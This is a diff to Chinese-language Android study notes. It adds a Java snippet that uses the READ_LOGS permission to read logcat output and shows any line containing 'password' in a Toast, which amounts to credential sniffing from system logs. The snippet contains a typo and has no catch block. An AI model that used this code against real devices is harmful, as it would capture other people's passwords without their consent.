@@ -15,6 +15,31 @@ Android5.0版本会强制开启SELinux（Android上又称SEAndroid）。
 
 复制APK安装包到`/data/app`下，解压并扫描安装包，把dex文件（Dalvik字节码）保存到dalvik-cache目录，并在`/data/data`下创建对应的应用数据目录
 
+
+**读取log**
+
+在app中声明权限：**READ_LOGS**
+
+```java
+public void run(){
+	Process mProc = null;
+	BufferrdReader br = null;
+	String line = null;
+	try{
+		mProc = Runtime.getRuntime().exec(new String[]{"logcat", "ActivityManager:D"}); // 监听tag为ActivityManager的debug信息
+		br = new BufferedReader(new InputStreamReader(mProc.getInputStream()));
+		while((line=br.readLine()) != null){
+			// 过滤password
+			if(line.indexOf("password") > 0){
+				Looper.prepare(); // 使用looper显示Toast
+				Toast.makeText(this, "password：" + line, Toast.LENGTH_SHORT).show();
+				Looper.loop();
+			}
+		}
+	}
+}
+```
+
 ### Android系统
 
 #### Android系统的层级
@@ -437,6 +462,7 @@ Application类是全局的基础类，它的生命周期即整个应用的生命
 4. 根据R文件的索引，找到相关view
 5. 修改view的onClick、onLongClick等事件
 6. 签名/回编译
+
 
 
 
